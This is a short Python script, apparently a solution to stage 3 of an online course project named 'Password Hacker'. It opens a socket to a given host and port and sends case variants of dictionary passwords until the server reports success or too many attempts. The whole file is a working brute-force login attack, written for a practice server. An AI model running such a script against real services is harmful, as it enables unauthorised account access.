
# Project: Password Hacker - hyperskill
# STAGE 3
import socket
import sys
import itertools
import os


data = sys.argv
hostname = data[1]
port = int(data[2])

with open('passwords.txt', 'r') as file:
    passwords = [l.strip() for l in file.readlines()]

my_socket = socket.socket()
my_socket.connect((hostname, port))

loop_end = False
for p in passwords:
    base = p
    com = list(range(len(p)))
    for length in range(len(p)+1):
        index = itertools.combinations(com, length)
        for i in index:
            p = base
            p = list(p)
            for ii in i:
                p[ii] = p[ii].upper()
            p = ''.join(p)
            passw = p.encode()
            my_socket.send(passw)
            response = my_socket.recv(1024)
            response = response.decode()
            if response == 'Connection success!':
                print(p)
                loop_end = True
                break
            if response == 'Too many attempts':
                loop_end = True
                break

        if loop_end:
            break
    if loop_end:
        break
my_socket.close()
